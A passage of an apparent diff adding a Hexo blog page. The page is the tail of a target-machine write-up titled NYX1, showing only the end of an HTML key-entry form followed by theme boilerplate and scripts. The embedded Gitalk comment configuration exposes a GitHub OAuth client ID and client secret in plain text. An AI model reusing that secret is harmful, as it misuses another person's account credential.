class="hljs-string">&quot;POST&quot;</span>&gt;<br>    Enter the key: &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;key&quot;</span>/&gt;<br>    &lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;submit&quot;</span> value=<span class="hljs-string">&quot;submit&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/knowledge-database/" class="category-chain-item">knowledge_database</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>NYX1</div>
+      <div>https://i3eg1nner.github.io/2023/06/1d78c8deaa4a.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>I3eg1nner</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年6月17日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/06/5ded43f5bb93.html" title="Topology靶机">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Topology靶机</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/06/b0b39d4ac246.html" title="THE PLANETS MERCURY">
+                        <span class="hidden-mobile">THE PLANETS MERCURY</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"a14e9a13405642f51885","clientSecret":"5662f466deab58fdbbacd0ae3718eaf1625401dd","repo":"gitalk","owner":"I3eg1nner","admin":["I3eg1nner"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: 'b38e9743378dbbd79da26e2117ef5079'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
